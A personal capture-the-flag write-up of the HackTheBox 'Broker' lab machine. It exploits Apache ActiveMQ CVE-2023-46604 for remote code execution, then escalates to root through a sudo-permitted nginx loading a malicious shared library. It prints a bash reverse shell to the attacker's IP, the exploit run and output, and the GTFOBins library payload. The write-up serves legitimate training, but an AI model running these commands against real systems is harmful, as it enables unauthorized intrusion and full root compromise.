---
layout: default
title: "Broker"
date: 2026-08-27
---

# Broker - HackTheBox

**OS:** Linux

**Difficulty:** Easy

**Pawn Date:** 24/08/27

---

## Recognition
 ### nmap 
```
nmap -p- --min-rate 80000 IP
```

**Ports Found:** 22 (SSH) 80 (http) 61613,61616 (ActiveMQ) 1883 (mqtt) 5672 (amqp)
8161,61614 (http) 39751

---

## Enumeration:

If we visit the webserver (port 80) the site asks for authentification, i tried to bruteforce it
but it was FAST hahah, because the password and the username  was `admin` `admin` so it was
pretty easy to get in. Inside of the page i saw ```Manage ActiveMQ broker``` i clicked on it
and it redirects me to the web folder `/admin/` inside of that theres alot ot useful info, like
the name, ID, Uptime, but the most important for this machine, `The version 5.15.15` so i searched about
what was ActiveMQ and if theres any CVEs for that version.

## Initial Access:

After doing my research i found the `CVE-2023-46604` that basically is a deserialization vulnerability
that exists in Apache ActiveMQ's OpenWire protocol. This flaw can be exploited by any attacker to gain 
RCE on the server. So i just installed this github repo that automates the process for us:
```
https://github.com/evkl1d/CVE-2023-46604
```
For more info about the vuln you can always see on google to really understand how this works, but after
i modified the exploit from this:
`bash -c 'bash -i >& /dev/tcp/10.10.10.10/9001'`

to this: `bash -c 'bash -i >& /dev/tcp/10.10.17.140/9001`

i set python web server 
```
sudo python3 -m http.server 80
```

i set my nc listener 
```
nc -lvnp 9001
```

and ran the exploit
```
python3 exploit.py -i 10.129.48.252 -u http://10.10.17.140/poc.xml
     _        _   _           __  __  ___        ____   ____ _____ 
    / \   ___| |_(_)_   _____|  \/  |/ _ \      |  _ \ / ___| ____|
   / _ \ / __| __| \ \ / / _ \ |\/| | | | |_____| |_) | |   |  _|  
  / ___ \ (__| |_| |\ V /  __/ |  | | |_| |_____|  _ <| |___| |___ 
 /_/   \_\___|\__|_| \_/ \___|_|  |_|\__\_\     |_| \_\\____|_____|

[*] Target: 10.129.48.252:61616
[*] XML URL: http://10.10.17.140/poc.xml

[*] Sending packet: 0000006c1f000000000000000000010100426f72672e737072696e676672616d65776f726b2e636f6e7465787
42e737570706f72742e436c61737350617468586d6c4170706c69636174696f6e436f6e74657874010019687474703a2f2f31302e3130
2e31342e362f706f632e786d6c
```

I got the reverse shell! 
```
nc -lnvp 9001
Listening on 0.0.0.0 9001
Connection received on 10.129.48.252
bash: cannot set terminal process group (880): Inappropriate ioctl for device
bash: no job control in this shell
activemq@broker:/opt/apache-activemq-5.15.15/bin$
```

Obviously after that ill do the shell upgrade
```
activemq@broker:/opt/apache-activemq-5.15.15/bin$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
activemq@broker:/opt/apache-activemq-5.15.15/bin$ ^Z
[1]+  Stopped                 nc -lnvp 9001
~ stty raw -echo ; fg
nc -lnvp 9001
             reset
reset: unknown terminal type unknown
Terminal type? screen
activemq@broker:/opt/apache-activemq-5.15.15/bin$ 
```
In this moment you can grab the user flag with `cat /home/activemq/user.txt` but thats not important anymore
because we want the root flag.

## Privilege Escalation:

Like always i checked what i can run as root without password and saw this 
```
activemq@broker:~$ sudo -l
Matching Defaults entries for activemq on broker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```
After that i went to `https://gtfobins.org/gtfobins/nginx/` to see how can i escalate and just
by checking i found this:

### Library load

This executable can load shared libraries that may be used to run arbitrary code in the same execution 
context.

Sudo

This function is performed by the privileged user if executed via sudo because the acquired privileges are 
not dropped.

```
cat >/path/to/temp-file <<EOF
load_module /path/to/lib.so;
EOF

nginx -t -c /path/to/temp-file
```

Payload

As an example, the following can be used to create a minimal shared library (lib.so) that spawns a shell 
upon loading:

```
echo '__attribute__((constructor)) init() { execl("/bin/sh", "sh", 0); }' \
    | gcc -w -fPIC -shared -o lib.so -x c -
```

By this moment is so clear what i need to do, have everything to escalate i just need to move to
`/tmp` make the lib.so file with the payload that GTFOBins gave me 
```
echo '__attribute__((constructor)) init() { execl("/bin/sh", "sh", 0); }' \
    | gcc -w -fPIC -shared -o lib.so -x c -
```
and modify the ">/path/to/temp-file" with the name as you want in my case `/tmp/alv` and it looks
like this:
```
cat > /tmp/alv <<EOF
load_module /tmp/lib.so;
EOF
```
By now you just need to run Nginx with sudo `sudo nginx -t -c /tmp/alv` and you will got a root
shell to grab the flag with `cat /root/root.txt` 
